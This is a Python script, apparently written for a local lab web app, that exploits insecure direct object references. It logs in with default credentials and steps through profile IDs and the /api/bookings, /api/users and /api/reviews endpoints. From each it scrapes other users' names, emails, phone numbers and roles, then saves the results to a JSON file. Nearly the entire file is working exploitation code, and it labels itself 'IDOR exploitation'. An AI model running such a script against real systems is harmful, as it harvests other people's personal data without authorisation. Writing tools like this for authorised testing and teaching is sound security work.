#!/usr/bin/env python3
"""idor_test.py - insecure direct object reference testing"""

import argparse
import json
import re
import sys
import time

import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

init(autoreset=True)


def banner():
    print(f"{Fore.CYAN}{'='*60}")
    print(f"  idor_test.py - IDOR exploitation")
    print(f"{'='*60}{Style.RESET_ALL}\n")


def authenticate(base_url, username="john", password="password"):
    """login and return an authenticated session"""
    session = requests.Session()
    login_url = f"{base_url}/login"
    session.get(login_url, timeout=5)
    resp = session.post(login_url, data={"username": username, "password": password},
                        timeout=5, allow_redirects=True)
    # verify we're logged in
    if "logout" in resp.text.lower():
        print(f"{Fore.YELLOW}[*] authenticated as {username}")
        return session
    print(f"{Fore.RED}[!] authentication failed for {username}")
    return None


def enumerate_profiles(base_url, session, max_id=6):
    """iterate through user profile ids and see what we can access"""
    print(f"{Fore.YELLOW}[*] enumerating user profiles (id 1-{max_id})...")
    results = []

    for user_id in range(1, max_id + 1):
        url = f"{base_url}/profile/{user_id}"
        try:
            resp = session.get(url, timeout=5)

            if resp.status_code == 200:
                profile_data = extract_profile_data(resp.text)
                if profile_data:
                    print(f"{Fore.RED}  [+] id={user_id}: {profile_data.get('username', 'unknown')} "
                          f"- {profile_data.get('email', 'no email')}")
                    results.append({
                        "id": user_id,
                        "url": url,
                        "status": 200,
                        "data": profile_data
                    })
                else:
                    print(f"{Fore.YELLOW}  [*] id={user_id}: page exists but no data extracted")
                    results.append({
                        "id": user_id,
                        "url": url,
                        "status": 200,
                        "data": None
                    })
            elif resp.status_code == 403:
                print(f"{Fore.GREEN}  [-] id={user_id}: forbidden (access control working)")
            elif resp.status_code == 404:
                print(f"{Fore.YELLOW}  [*] id={user_id}: not found")
            else:
                print(f"{Fore.YELLOW}  [*] id={user_id}: status {resp.status_code}")

        except requests.ConnectionError:
            print(f"{Fore.RED}  [!] connection failed at id={user_id}")
            break

    return results


def extract_profile_data(html):
    """pull out user data from a profile page"""
    soup = BeautifulSoup(html, "html.parser")
    data = {}

    # the profile page has a profile-card div with info divs
    # format: <div class="info">Label: <span>value</span></div>
    profile_card = soup.find("div", class_="profile-card")
    if not profile_card:
        return None

    # get the full name from h2
    h2 = profile_card.find("h2")
    if h2:
        data["fullname"] = h2.get_text(strip=True)

    # get info fields
    info_divs = profile_card.find_all("div", class_="info")
    for div in info_divs:
        text = div.get_text(strip=True)
        span = div.find("span")
        value = span.get_text(strip=True) if span else ""

        if "Username:" in text:
            data["username"] = value
        elif "Email:" in text:
            data["email"] = value
        elif "Phone:" in text:
            data["phone"] = value
        elif "Role:" in text:
            data["role"] = value

    # check for bookings
    bookings_section = soup.find("h3", string=re.compile(r"Bookings", re.I))
    if bookings_section:
        data["has_bookings_section"] = True
        # look for booking entries after the h3
        booking_items = soup.find_all("div", class_="booking")
        if booking_items:
            data["booking_count"] = len(booking_items)

    return data if data else None


def test_api_idor(base_url, session):
    """test api endpoints for idor vulnerabilities"""
    print(f"\n{Fore.YELLOW}[*] testing API endpoints for IDOR...")
    results = []

    api_endpoints = [
        "/api/bookings/{id}",
        "/api/users/{id}",
        "/api/reviews/{id}",
    ]

    for pattern in api_endpoints:
        for obj_id in range(1, 6):
            url = f"{base_url}{pattern.format(id=obj_id)}"
            try:
                resp = session.get(url, timeout=5)
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        print(f"{Fore.RED}  [+] {pattern.format(id=obj_id)}: {json.dumps(data)[:80]}")
                        results.append({
                            "endpoint": pattern,
                            "id": obj_id,
                            "data": data
                        })
                    except ValueError:
                        pass
                elif resp.status_code == 404:
                    break
            except requests.ConnectionError:
                break

    if not results:
        print(f"{Fore.GREEN}  [-] no IDOR found on API endpoints")

    return results


def run_idor_test(target_url, max_id=6):
    """main idor testing routine"""
    banner()

    # authenticate first - the profile endpoint requires a logged-in session
    session = authenticate(target_url)
    if not session:
        print(f"{Fore.RED}[!] cannot run idor test without authentication")
        return {
            "target": target_url,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "profiles": [],
            "api_idor": [],
            "error": "authentication failed"
        }

    results = {
        "target": target_url,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "profiles": [],
        "api_idor": []
    }

    results["profiles"] = enumerate_profiles(target_url, session, max_id)
    results["api_idor"] = test_api_idor(target_url, session)

    profiles_accessed = sum(1 for p in results["profiles"] if p.get("data"))
    api_leaks = len(results["api_idor"])

    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"  idor test complete")
    print(f"  profiles with data: {profiles_accessed}")
    print(f"  api data leaks: {api_leaks}")
    print(f"{'='*60}{Style.RESET_ALL}")

    return results


def main():
    parser = argparse.ArgumentParser(description="idor_test.py - IDOR exploitation")
    parser.add_argument("-t", "--target", default="http://localhost:5000",
                        help="target URL")
    parser.add_argument("--max-id", type=int, default=6,
                        help="max user ID to enumerate (default: 6)")
    parser.add_argument("-o", "--output", default="idor_results.json",
                        help="output file")
    args = parser.parse_args()

    results = run_idor_test(args.target, args.max_id)

    with open(args.output, "w") as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\n{Fore.GREEN}[+] results saved to {args.output}")


if __name__ == "__main__":
    main()
